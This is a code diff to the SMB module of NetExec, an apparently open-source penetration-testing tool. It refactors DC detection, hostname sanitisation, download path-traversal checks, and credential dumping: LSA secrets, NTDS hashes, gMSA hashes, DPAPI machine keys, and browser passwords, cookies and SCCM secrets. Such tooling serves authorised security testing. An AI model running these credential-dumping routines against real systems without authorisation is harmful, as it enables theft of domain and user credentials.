@@ -6,14 +6,16 @@ import struct
 import ipaddress
 from pathlib import Path
 
-from nxc.helpers.path import sanitize_filename
+from nxc.helpers.path import sanitize_path_component
 from Cryptodome.Hash import MD4
 from textwrap import dedent
+from nxc.helpers.misc import sanitize_dns
 
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.smb import SMB_DIALECT
 from impacket.smb3structs import SMB2_DIALECT_30, SMB2_NEGOTIATE_SIGNING_REQUIRED
 from impacket.examples.secretsdump import (
+    LocalOperations,
     RemoteOperations,
     SAMHashes,
     LSASecrets,
@@ -59,11 +61,11 @@ from impacket.smb3structs import (
 from impacket.dcerpc.v5 import tsts as TSTS
 
 from nxc.config import process_secret, host_info_colors, check_guest_account, display_dc
-from nxc.connection import connection, sem, requires_admin, dcom_FirewallChecker
+from nxc.connection import connection, sem, requires_admin
+from nxc.helpers.rpc import dcom_FirewallChecker
 from nxc.helpers.misc import gen_random_string, validate_ntlm
 from nxc.logger import NXCAdapter
-from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection
-from nxc.protocols.smb.firefox import FirefoxCookie, FirefoxData, FirefoxTriage
+from nxc.paths import NXC_PATH
 from nxc.protocols.smb.kerberos import kerberos_login_with_S4U, kerberos_altservice, get_realm_from_ticket
 from nxc.protocols.smb.wmiexec import WMIEXEC
 from nxc.protocols.smb.atexec import TSCH_EXEC
@@ -76,17 +78,13 @@ from nxc.protocols.smb.samrfunc import SamrFunc
 from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.helpers.logger import highlight
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.dpapi import DPAPITriage
 from nxc.helpers.rpc import NXCRPCConnection
 from nxc.helpers.powershell import create_ps_command
 from nxc.helpers.misc import detect_if_ip
 from nxc.protocols.ldap.resolution import LDAPResolution
 
-from dploot.triage.vaults import VaultsTriage
-from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
-from dploot.triage.credentials import CredentialsTriage
-from dploot.triage.cng import CngTriage
-from dploot.lib.target import Target
-from dploot.triage.sccm import SCCMTriage, SCCMCred, SCCMSecret, SCCMCollection
+from dploot.lib.network.smb import SMBTarget as Target
 
 from time import time, ctime, sleep
 from traceback import format_exc
@@ -133,18 +131,18 @@ class smb(connection):
         self.server_os_major = None
         self.server_os_minor = None
         self.server_os_build = None
-        self.os_arch = 0
+        self.os_arch = None
         self.hash = None
         self.lmhash = ""
         self.nthash = ""
         self.remote_ops = None
         self.bootkey = None
+        self.dpapi_system_key = None
         self.smbv1 = None   # Check if SMBv1 is supported
         self.smbv3 = None   # Check if SMBv3 is supported
         self.is_timed_out = False
         self.signing = False
         self.smb_share_name = smb_share_name
-        self.pvkbytes = None
         self.no_da = None
         self.no_ntlm = False
         self.null_auth = False
@@ -153,6 +151,8 @@ class smb(connection):
         self.isdc = None
         self.tgt = None
         self.tgs = None
+
+        self._dpapi_triage = None
 
         connection.__init__(self, args, db, host)
 
@@ -187,7 +187,7 @@ class smb(connection):
         except Exception as e:
             self.logger.debug(f"Error retrieving os arch of {self.host}: {e!s}")
 
-        return 0
+        return None
 
     def enum_host_info(self):
         self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
@@ -204,28 +204,33 @@ class smb(connection):
                 self.no_ntlm = True
                 self.logger.debug("NTLM not supported")
 
+        # Runs before the DC check: the RPC tier reuses its port 135 result instead of probing the port again
+        self.os_arch = self.get_os_arch()
+
         aggressive_check = bool(self.args.generate_hosts_file or self.args.generate_krb5_file)
         self.is_host_dc(aggressive_check=aggressive_check)
 
         # self.domain is the attribute we authenticate with
         # self.targetDomain is the attribute which gets displayed as host domain
+        # self.remoteName is the attribute which gets used in the SPN
+        self.hostname = self.host
+        self.targetDomain = self.host
+        self.remoteName = self.host
         if not self.no_ntlm:
             # Try to get hostname with getServerDNSHostName as getServerName is truncated to 15 chars
-            dns_hostname = self.conn.getServerDNSHostName().upper()
+            dns_hostname = sanitize_dns(self.conn.getServerDNSHostName() or self.conn.getServerName(), self.logger).upper()
             if dns_hostname and "." in dns_hostname:
-                self.hostname = dns_hostname.split(".")[0]
-            elif dns_hostname:
-                self.hostname = dns_hostname
+                self.hostname = dns_hostname.split(".", 1)[0]
             else:
-                self.hostname = self.conn.getServerName()
-            self.targetDomain = self.conn.getServerDNSDomainName()
-            if not self.targetDomain:   # Not sure if that can even happen but now we are safe
-                self.targetDomain = self.hostname
+                self.hostname = dns_hostname
+            self.targetDomain = sanitize_dns(self.conn.getServerDNSDomainName() or self.hostname, self.logger)
+            # Preserve IP as target if not required by Kerberos to avoid issues when DNS is not resolvable
+            self.remoteName = dns_hostname if self.kerberos else self.host
         else:
             try:
                 # If we know the host is a DC we can still get the hostname over LDAP if NTLM is not available
                 if self.isdc and detect_if_ip(self.host):
-                    self.hostname, self.domain = LDAPResolution(self.host).get_resolution()
+                    self.hostname, self.domain, self.remoteName = LDAPResolution(self.host).get_resolution()
                     self.targetDomain = self.domain
                 # If we can't authenticate with NTLM and the target is supplied as a FQDN we must parse it
                 else:
@@ -233,19 +238,12 @@ class smb(connection):
                     import socket
                     socket.inet_aton(self.host)
                     self.logger.debug("NTLM authentication not available! Authentication will fail without a valid hostname and domain name")
-                    self.hostname = self.host
-                    self.targetDomain = self.host
             except OSError:
                 if self.host.count(".") >= 1:
                     self.hostname = self.host.split(".")[0]
                     self.targetDomain = ".".join(self.host.split(".")[1:])
-                else:
-                    self.hostname = self.host
-                    self.targetDomain = self.host
             except Exception as e:
                 self.logger.debug(f"Error getting hostname from LDAP: {e}")
-                self.hostname = self.host
-                self.targetDomain = self.host
 
         if self.args.domain:
             self.domain = self.args.domain
@@ -260,7 +258,6 @@ class smb(connection):
 
         # As of June 2024 Samba will always report the version as "Windows 6.1", apparently due to a bug https://stackoverflow.com/a/67577401/17395725
         # Together with the reported build version "0" by Samba we can assume that it is a Samba server. Windows should always report a build version > 0
-        # Also only on Windows we should get an OS arch as for that we would need MSRPC
         try:
             self.server_os = self.conn.getServerOS()
             self.server_os_major = self.conn.getServerOSMajor()
@@ -273,9 +270,9 @@ class smb(connection):
         if isinstance(self.server_os.lower(), bytes):
             self.server_os = self.server_os.decode("utf-8")
 
-        if "Windows 6.1" in self.server_os and self.server_os_build == 0 and self.os_arch == 0:
+        if "Windows 6.1" in self.server_os and self.server_os_build == 0:
             self.server_os = "Unix - Samba"
-        elif self.server_os_build == 0 and self.os_arch == 0:
+        elif self.server_os_build == 0:
             self.server_os = "Unix"
         self.logger.debug(f"Server OS: {self.server_os} {self.server_os_major}.{self.server_os_minor} build {self.server_os_build}")
 
@@ -285,8 +282,6 @@ class smb(connection):
             self.signing = self._is_signing_required()
         except Exception as e:
             self.logger.debug(e)
-
-        self.os_arch = self.get_os_arch()
 
         # moved at the end because it can cause issues with some DCs if we try to login as guest before checking if dc or not
         if check_guest_account and not self.no_ntlm:
@@ -314,9 +309,6 @@ class smb(connection):
             )
         except Exception as e:
             self.logger.debug(f"Error adding host {self.host} into db: {e!s}")
-
-        # DCOM connection with kerberos needed
-        self.remoteName = self.host if not self.kerberos else f"{self.hostname}.{self.targetDomain}"
 
         # using kdcHost is buggy on impacket when using trust relation between ad so we kdcHost must stay to none if targetdomain is not equal to domain
         if not self.kdcHost and self.domain and self.domain == self.targetDomain:
@@ -428,6 +420,8 @@ class smb(connection):
                 if self.args.generate_st:
                     self.save_st(tgs, sk, spn if self.args.spn else None)
 
+            if not tgs and not useCache:
+                self.logger.debug(f"TGS for cifs/{self.remoteName} will be requested")
             self.conn.kerberosLogin(self.username, password, domain, lmhash, nthash, aesKey, kdcHost, useCache=useCache, TGS=tgs)
 
             if self.args.generate_st:
@@ -874,9 +868,7 @@ class smb(connection):
         if self.isdc is not None:
             return self.isdc
 
-        probes = [self._is_dc_via_smb]
-        if aggressive_check:
-            probes.append(self._is_dc_via_rpc)
+        probes = [self._is_dc_via_smb, self._is_dc_via_rpc]
         if self.no_ntlm or aggressive_check:
             probes.append(self._is_dc_via_kerberos)
 
@@ -895,17 +887,13 @@ class smb(connection):
         session we already hold answers without enumerating every share (unlike
         listShares). ACCESS_DENIED still proves the share exists, hence a DC.
 
-        Meant to run while the null session is still fresh. When there is no
-        session, the reason is decisive: a DC with NTLM enabled always accepts
-        the null bind, so "NTLM on + no null session" means this is NOT a DC.
-        Only "NTLM disabled" is inconclusive here (a real DC can refuse the null
-        bind then), so we hand that case off to the Kerberos tier.
+        Meant to run while the null session is still fresh. Without a session
+        this check is inconclusive: DCs can refuse the null bind (Server 2025
+        does by default, as does an NTLM-disabled DC), so we hand off to the
+        RPC/Kerberos tiers.
         """
         if not self.null_auth:
-            if not self.no_ntlm:
-                self.logger.debug("NTLM enabled but no null session: host is not a DC")
-                return False
-            self.logger.debug("No null session (NTLM disabled): deferring to Kerberos")
+            self.logger.debug("No null session: SMB DC check inconclusive, deferring to RPC/Kerberos")
             return None
         try:
             tid = self.conn.connectTree("SYSVOL")
@@ -961,15 +949,17 @@ class smb(connection):
     def _is_dc_via_rpc(self):
         """
         Unauthenticated Netlogon endpoint-mapper lookup on 135. NTLM-agnostic
-        and needs no session;
+        and needs no session. get_os_arch() already talks to the endpoint mapper
+        on every scan, so this adds no new port and runs only when that call
+        reached 135 (no extra timeout when 135 is filtered, e.g. over proxychains).
         """
         from impacket.dcerpc.v5 import nrpc, epm
 
-        if not self._is_port_open(135):
-            self.logger.debug("Port 135 closed/filtered: RPC inconclusive, deferring to Kerberos")
+        if self.os_arch is None:
+            self.logger.debug("Port 135 unreachable (OS arch probe failed): RPC inconclusive, deferring to Kerberos")
             return None
 
-        self.logger.debug("Port 135 is open, attempting Netlogon MSRPC lookup...")
+        self.logger.debug("Port 135 reachable, attempting Netlogon MSRPC lookup...")
         try:
             epm.hept_map(self.host, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
             self.logger.debug("Netlogon endpoint registered: host is a DC")
@@ -1268,7 +1258,7 @@ class smb(connection):
                     self.logger.error("Could not get process list")
                     return
 
-                pidList = [i["UniqueProcessId"] for i in res if i["ImageName"].lower() == self.args.taskkill.lower()]
+                pidList = [i.getProcessInfo()["UniqueProcessId"] for i in res if i.getProcessInfo()["ImageName"].getValue().lower() == self.args.taskkill.lower()]
                 if not pidList:
                     self.logger.fail(f"Could not find process named {self.args.taskkill}")
                     return
@@ -1382,12 +1372,12 @@ class smb(connection):
     @requires_admin
     def tasklist(self):
         # Formats a row to be printed on screen
-        def format_row(procInfo):
+        def format_row(procInfo, pSid):
             return template.format(
-                procInfo["ImageName"],
-                procInfo["UniqueProcessId"],
-                procInfo["SessionId"],
-                procInfo["pSid"],
+                str(procInfo["ImageName"].getValue()),
+                str(procInfo["UniqueProcessId"]),
+                str(procInfo["SessionId"]),
+                pSid,
                 f"{procInfo['WorkingSetSize'] // 1000:,} K",
             )
 
@@ -1403,8 +1393,8 @@ class smb(connection):
                 if not res:
                     return
                 self.logger.success("Enumerated processes")
-                maxImageNameLen = max(len(i["ImageName"]) for i in res)
-                maxSidLen = max(len(i["pSid"]) for i in res)
+                maxImageNameLen = max(len(i.getProcessInfo()["ImageName"].getValue()) for i in res)
+                maxSidLen = max(len(i.getSid()) for i in res)
                 template = f"{{: <{maxImageNameLen}}} {{: <8}} {{: <11}} {{: <{maxSidLen}}} {{: >12}}"
                 self.logger.highlight(template.format("Image Name", "PID", "Session#", "SID", "Mem Usage"))
                 self.logger.highlight(template.replace(": ", ":=").format("", "", "", "", ""))
@@ -1415,12 +1405,12 @@ class smb(connection):
                     # If args.tasklist is not True then a process name was supplied
                     if self.args.tasklist is not True:
                         # So we look for it and print its information if found
-                        if self.args.tasklist.lower() in procInfo["ImageName"].lower():
+                        if self.args.tasklist.lower() in procInfo.getProcessInfo()["ImageName"].getValue().lower():
                             found_task = True
-                            self.logger.highlight(format_row(procInfo))
+                            self.logger.highlight(format_row(procInfo.getProcessInfo(), procInfo.getSid()))
                     # Else, no process was supplied, we print the entire list of remote processes
                     else:
-                        self.logger.highlight(format_row(procInfo))
+                        self.logger.highlight(format_row(procInfo.getProcessInfo(), procInfo.getSid()))
 
                 # If a process was suppliad to args.tasklist and it was not found, we print a fail message
                 if self.args.tasklist is not True and not found_task:
@@ -1991,9 +1981,10 @@ class smb(connection):
             namespace = self.args.wmi_namespace
 
         try:
-            dcom = DCOMConnection(self.remoteName, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.kerberos, kdcHost=self.kdcHost, aesKey=self.aesKey, remoteHost=self.host)
+            *_, tgt, _ = self.conn.getCredentials()
+            dcom = DCOMConnection(self.remoteName, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.kerberos, kdcHost=self.kdcHost, aesKey=self.aesKey, remoteHost=self.host, TGT=tgt)
             iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
-            flag, stringBinding = dcom_FirewallChecker(iInterface, self.host, self.args.dcom_timeout)
+            flag, stringBinding = dcom_FirewallChecker(iInterface, self.host, self.args.dcom_timeout, self.logger)
             if not flag or not stringBinding:
                 error_msg = f"WMI Query: Dcom initialization failed on connection with stringbinding: '{stringBinding}', please increase the timeout with the option '--dcom-timeout'. If it's still failing maybe something is blocking the RPC connection, try another exec method"
 
@@ -2170,10 +2161,10 @@ class smb(connection):
 
     def get_file_single(self, remote_path, download_path, silent=False):
         share_name = self.args.share
+        if self.args.append_host:
+            download_path = sanitize_path_component(f"{self.hostname}-{remote_path}")
         if not silent:
             self.logger.display(f"Copying '{remote_path}' to '{download_path}'")
-        if self.args.append_host:
-            download_path = f"{self.hostname}-{remote_path}"
         with open(download_path, "wb+") as file:
             if self.download_file(share_name, remote_path, file.write):
                 if not silent:
@@ -2206,10 +2197,18 @@ class smb(connection):
 
         filtered_items = [item for item in items if item.get_longname() not in [".", ".."]]
 
-        # create local directory structure regardless of content; download empty folders by default
-        # change the Windows path to Linux and then join it with the base directory to get our actual save path
-        relative_path = os.path.join(*folder.replace(base_dir or folder, "").lstrip("\\").split("\\"))
-        local_folder_path = os.path.join(dest, relative_path)
+        # Create a safe local directory structure while retaining the raw remote path for SMB.
+        try:
+            relative_path = ntpath.relpath(folder, base_dir or folder)
+        except ValueError:
+            relative_path = folder
+        relative_parts = [] if relative_path == "." else [sanitize_path_component(part) for part in relative_path.split("\\") if part]
+        local_folder_path = os.path.join(dest, *relative_parts)
+        destination_path = Path(dest).resolve()
+        resolved_folder = Path(local_folder_path).resolve()
+        if resolved_folder != destination_path and destination_path not in resolved_folder.parents:
+            self.logger.fail(f"Path traversal detected in '{folder}', skipping")
+            return
 
         if not filtered_items and ignore_empty:
             self.logger.debug(f"Skipping empty folder '{folder}'")
@@ -2221,22 +2220,20 @@ class smb(connection):
             self.logger.display(f"Created empty directory '{local_folder_path}'")
 
         for item in filtered_items:
-            item_name = sanitize_filename(item.get_longname())
-            if not item_name:
-                self.logger.fail(f"Path traversal detected in '{item.get_longname()}', skipping")
-                continue
-            dir_path = ntpath.normpath(ntpath.join(folder, item_name))
-            self.logger.debug(f"Parsing item: {item_name}, {dir_path}")
+            remote_item_name = item.get_longname()
+            item_name = sanitize_path_component(remote_item_name)
+            dir_path = ntpath.normpath(ntpath.join(folder, remote_item_name))
+            self.logger.debug(f"Parsing item: {remote_item_name!r}, {dir_path!r}")
 
             if item.is_directory() and recursive:
-                self.logger.debug(f"Found new directory to parse: {dir_path}")
+                self.logger.debug(f"Found new directory to parse: {dir_path!r}")
                 self.download_folder(dir_path, dest, recursive, silent, base_dir or folder, ignore_empty)
             elif not item.is_directory():
-                remote_file_path = ntpath.join(folder, item_name)
+                remote_file_path = ntpath.join(folder, remote_item_name)
                 local_file_path = os.path.join(local_folder_path, item_name)
                 # Defense-in-depth: verify path stays under destination
                 resolved = Path(local_file_path).resolve()
-                if not str(resolved).startswith(str(Path(dest).resolve()) + os.sep):
+                if destination_path not in resolved.parents:
                     self.logger.fail(f"Path traversal detected in '{item_name}', skipping")
                     continue
                 self.logger.debug(f"{dest=} {remote_file_path=} {relative_path=} {local_folder_path=} {local_file_path=}")
@@ -2244,7 +2241,7 @@ class smb(connection):
                 try:
                     self.get_file_single(remote_file_path, local_file_path, silent)
                 except FileNotFoundError:
-                    self.logger.fail(f"Error downloading file '{remote_file_path}' due to file not found (probably a race condition between listing and downloading)")
+                    self.logger.fail(f"Error downloading file '{remote_file_path!r}' due to file not found (probably a race condition between listing and downloading)")
 
     def get_folder(self):
         recursive = self.args.recursive
@@ -2328,255 +2325,32 @@ class smb(connection):
 
     @requires_admin
     def sccm(self):
-        target = Target.create(
-            domain=self.domain,
-            username=self.username,
-            password=self.password,
-            target=self.hostname + "." + self.domain if self.kerberos else self.host,
-            lmhash=self.lmhash,
-            nthash=self.nthash,
-            do_kerberos=self.kerberos,
-            kdcHost=self.kdcHost,
-            dc_ip=self.kdcHost,
-            aesKey=self.aesKey,
-            no_pass=True,
-            use_kcache=self.use_kcache,
-        )
-
-        conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
-        if conn is None:
-            self.logger.debug("Could not upgrade connection")
-            return
-
-        masterkeys = collect_masterkeys_from_target(self, target, conn, user=False)
-
-        if len(masterkeys) == 0:
-            self.logger.fail("No masterkeys looted")
-            return
-
-        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials through {self.args.sccm}")
-
-        def sccm_callback(secret):
-            if isinstance(secret, SCCMCred):
-                tag = "NAA Account"
-                self.logger.highlight(f"[{tag}] {secret.username.decode('latin-1')}:{secret.password.decode('latin-1')}")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    f"SCCM - {tag}",
-                    "SYSTEM",
-                    secret.username.decode("latin-1"),
-                    secret.password.decode("latin-1"),
-                    "N/A",
-                )
-            elif isinstance(secret, SCCMSecret):
-                tag = "Task sequences secret"
-                self.logger.highlight(f"[{tag}] {secret.secret.decode('latin-1')}")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    f"SCCM - {tag}",
-                    "SYSTEM",
-                    "N/A",
-                    secret.secret.decode("latin-1"),
-                    "N/A",
-                )
-            elif isinstance(secret, SCCMCollection):
-                tag = "Collection Variable"
-                self.logger.highlight(f"[{tag}] {secret.variable.decode('latin-1')}:{secret.value.decode('latin-1')}")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    f"SCCM - {tag}",
-                    "SYSTEM",
-                    secret.variable.decode("latin-1"),
-                    secret.value.decode("latin-1"),
-                    "N/A",
-                )
-        try:
-            sccm_triage = SCCMTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=sccm_callback)
-            sccm_triage.triage_sccm(use_wmi=self.args.sccm == "wmi", )
-        except Exception as e:
-            self.logger.debug(f"Error while looting sccm: {e}")
+        self.dpapi_triage.triage_sccm()
 
     @requires_admin
     def dpapi(self):
-        dump_system = "nosystem" not in self.args.dpapi
+        self.dpapi_triage.triage_dpapi()
 
-        if self.args.pvk is not None:
-            try:
-                with open(self.args.pvk, "rb") as f:
-                    self.pvkbytes = f.read()
-                self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
-            except Exception as e:
-                self.logger.fail(str(e))
-
-        if self.pvkbytes is None:
-            self.pvkbytes = get_domain_backup_key(self)
-
+    @property
+    def dpapi_triage(self) -> DPAPITriage:
+        if self._dpapi_triage is not None:
+            return self._dpapi_triage
         target = Target.create(
             domain=self.domain,
             username=self.username,
             password=self.password,
-            target=self.remoteName,
+            address=self.remoteName,
             lmhash=self.lmhash,
             nthash=self.nthash,
             do_kerberos=self.kerberos,
             kdcHost=self.kdcHost,
             dc_ip=self.kdcHost,
             aesKey=self.aesKey,
-            no_pass=True,
             use_kcache=self.use_kcache,
         )
 
-        self.output_file = open(self.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8")  # ruff: ignore[open-file-with-context-handler]
-
-        conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
-        if conn is None:
-            self.logger.debug("Could not upgrade connection")
-            return
-
-        masterkeys = collect_masterkeys_from_target(self, target, conn, system=dump_system)
-
-        if len(masterkeys) == 0:
-            self.logger.fail("No masterkeys looted")
-            return
-
-        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
-
-        # Collect User and Machine Credentials Manager secrets
-        def credential_callback(credential):
-            tag = "CREDENTIAL"
-            line = f"[{credential.winuser}][{tag}] {credential.target} - {credential.username}:{credential.password}"
-            self.logger.highlight(line)
-            if self.output_file:
-                self.output_file.write(line + "\n")
-            self.db.add_dpapi_secrets(
-                target.address,
-                tag,
-                credential.winuser,
-                credential.username,
-                credential.password,
-                credential.target,
-            )
-
-        try:
-            credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys, per_credential_callback=credential_callback)
-            self.logger.debug(f"Credentials Triage Object: {credentials_triage}")
-            credentials_triage.triage_credentials()
-            if dump_system:
-                credentials_triage.triage_system_credentials()
-        except Exception as e:
-            self.logger.debug(f"Error while looting credentials: {e}")
-
-        dump_cookies = "cookies" in self.args.dpapi
-
-        cng_chromekey = None
-        try:
-            cng_triage = CngTriage(target=target, conn=conn, masterkeys=masterkeys)
-            for cng_file in cng_triage.triage_system_cng():
-                if cng_file.cng_blob["Name"].decode("utf-16le").rstrip("\0") == "Google Chromekey1":
-                    self.logger.debug("Found CNG Google ChromeKey1\n")
-                    cng_chromekey = cng_file.decrypted_private_key
-        except Exception as e:
-            self.logger.debug(f"Error while getting CNG ChromeKey1: {e}")
-
-        # Collect Chrome Based Browser stored secrets
-        def browser_callback(secret):
-            if isinstance(secret, LoginData):
-                secret_url = secret.url + " -" if secret.url != "" else "-"
-                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret_url} {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    secret.browser.upper(),
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.url,
-                )
-            elif isinstance(secret, GoogleRefreshToken):
-                line = f"[{secret.winuser}][{secret.browser.upper()}] Google Refresh Token: {secret.service}:{secret.token}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    secret.browser.upper(),
-                    secret.winuser,
-                    secret.service,
-                    secret.token,
-                    "Google Refresh Token",
-                )
-            elif isinstance(secret, Cookie):
-                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret.host}{secret.path} - {secret.cookie_name}:{secret.cookie_value}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-
-        try:
-            browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
-            browser_triage.triage_browsers(gather_cookies=dump_cookies, cng_chromekey=cng_chromekey)
-        except Exception as e:
-            self.logger.debug(f"Error while looting browsers: {e}")
-
-        def vault_callback(secret):
-            tag = "IEX"
-            if secret.type == "Internet Explorer":
-                resource = secret.resource + " -" if secret.resource != "" else "-"
-                line = f"[{secret.winuser}][{tag}] {resource} - {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    tag,
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.resource,
-                )
-
-        try:
-            # Collect User Internet Explorer stored secrets
-            vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys, per_vault_callback=vault_callback)
-            vaults_triage.triage_vaults()
-        except Exception as e:
-            self.logger.debug(f"Error while looting vaults: {e}")
-
-        def firefox_callback(secret):
-            tag = "FIREFOX"
-            if isinstance(secret, FirefoxData):
-                url = secret.url + " -" if secret.url != "" else "-"
-                line = f"[{secret.winuser}][{tag}] {url} {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    tag,
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.url,
-                )
-            elif isinstance(secret, FirefoxCookie):
-                line = f"[{secret.winuser}][{tag}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-
-        try:
-            # Collect Firefox stored secrets
-            firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn, per_secret_callback=firefox_callback)
-            firefox_triage.run(gather_cookies=dump_cookies)
-        except Exception as e:
-            self.logger.debug(f"Error while looting firefox: {e}")
-
-        if self.output_file:
-            self.output_file.close()
-            with open(self.output_file_template.format(output_folder="dpapi")) as f:
-                if sum(1 for _ in f) == 0:
-                    self.logger.fail("No dpapi loot retrieved")
+        self._dpapi_triage = DPAPITriage(self, target)
+        return self._dpapi_triage
 
     @requires_admin
     def list_snapshots(self):
@@ -2593,13 +2367,22 @@ class smb(connection):
             self.logger.highlight(f"{drive:<8}{i:<26}")
 
     @requires_admin
-    def lsa(self):
+    def lsa(self, quiet=False):
         try:
-            self.enable_remoteops(regsecret=(self.args.lsa == "regdump"))
+            # --dpapi calls lsa() without --lsa, so it gets the default regdump mode too
+            self.enable_remoteops(regsecret=(self.args.lsa != "secdump"))
 
             def add_lsa_secret(secret):
                 add_lsa_secret.secrets += 1
-                self.logger.highlight(secret)
+                if "dpapi_machinekey" not in secret:
+                    if not quiet:
+                        self.logger.highlight(secret)
+                else:
+                    correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
+                    self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
+                    if not quiet:
+                        self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
+                        self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
                 if "_SC_GMSA_{84A78B8C" in secret:
                     gmsa_id = secret.split("_")[4].split(":")[0]
                     data = bytes.fromhex(secret.split("_")[4].split(":")[1])
@@ -2609,12 +2392,13 @@ class smb(connection):
                     ntlm_hash = MD4.new()
                     ntlm_hash.update(currentPassword)
                     passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
-                    self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
+                    if not quiet:
+                        self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
 
             add_lsa_secret.secrets = 0
 
             if self.remote_ops and self.bootkey:
-                if self.args.lsa == "regdump":
+                if self.args.lsa != "secdump":
                     LSA = RegSecretsLSASecrets(
                         self.bootkey,
                         self.remote_ops,
@@ -2629,13 +2413,15 @@ class smb(connection):
                         isRemote=True,
                         perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
                     )
-                self.logger.display("Dumping LSA secrets")
+                if not quiet:
+                    self.logger.display("Dumping LSA secrets")
                 self.output_filename = self.output_file_template.format(output_folder="lsa")
                 LSA.dumpCachedHashes()
                 LSA.exportCached(self.output_filename)
                 LSA.dumpSecrets()
                 LSA.exportSecrets(self.output_filename)
-                self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
+                if not quiet:
+                    self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
                 try:
                     self.remote_ops.finish()
                 except Exception as e:
@@ -2650,6 +2436,7 @@ class smb(connection):
 
     def ntds(self):
         self.enable_remoteops()
+        is_remote = True
         use_vss_method = False
         NTDSFileName = None
         host_id = self.db.get_hosts(filter_term=self.host)[0][0]
@@ -2704,20 +2491,21 @@ class smb(connection):
         add_hash.kerb_secrets = 0
         add_hash.added_to_db = 0
 
-        if self.remote_ops:
-            try:
-                if self.args.ntds == "vss":
-                    NTDSFileName = self.remote_ops.saveNTDS()
-                    use_vss_method = True
-            except Exception as e:
-                self.logger.fail(e)
+        if self.args.ntds == "vss":
+            use_vss_method = True
+            is_remote = False
+            output_folder = os.path.abspath(os.path.join(NXC_PATH, "logs", "ntds", sanitize_path_component(self.hostname)))
+            os.makedirs(output_folder, exist_ok=True)
+            sam_path, system_path, security_path, NTDSFileName = self.remote_ops.createSSandDownloadWMI("C:\\", output_folder, NTDS=True)
+            localOps = LocalOperations(system_path)
+            self.bootkey = localOps.getBootKey()
 
         self.output_filename = self.output_file_template.format(output_folder="ntds")
 
         NTDS = NTDSHashes(
             NTDSFileName,
             self.bootkey,
-            isRemote=True,
+            isRemote=is_remote,
             history=self.args.history,
             noLMHash=True,
             remoteOps=self.remote_ops,
